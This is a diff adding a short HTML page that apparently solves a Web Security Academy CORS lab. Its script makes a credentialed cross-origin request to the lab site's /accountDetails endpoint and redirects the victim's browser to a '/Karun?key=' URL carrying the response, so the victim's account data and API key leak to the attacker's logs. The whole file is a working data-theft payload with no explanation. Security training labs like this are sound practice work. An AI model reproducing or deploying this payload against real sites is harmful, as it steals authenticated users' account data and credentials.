@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <script>
+        const request= new XMLHttpRequest()
+
+        request.open("get","https://0a5b005803038b948017bd5900f500d3.web-security-academy.net/accountDetails",true)
+        request.onload = ()=>{
+            window.location.href ="/Karun?key=" + request.response
+        }
+        request.withCredentials = true
+        request.send()
+    </script>
+</body>
+</html>
